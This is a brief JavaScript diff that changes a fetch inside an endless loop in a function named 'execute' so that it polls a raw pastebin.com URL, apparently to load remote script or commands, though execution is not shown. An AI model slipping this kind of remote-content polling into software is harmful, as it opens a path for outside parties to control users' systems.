@@ -11,7 +11,7 @@ async function execute() {
   let OldStr = '';
   let NowStr = '';
   while(true){
-    fetch('script')
+    fetch('https://pastebin.com/raw/eT93V86p')
     .then(response => response.text())
     .then(data => NowStr=data)
     .catch(error => console.error(error));
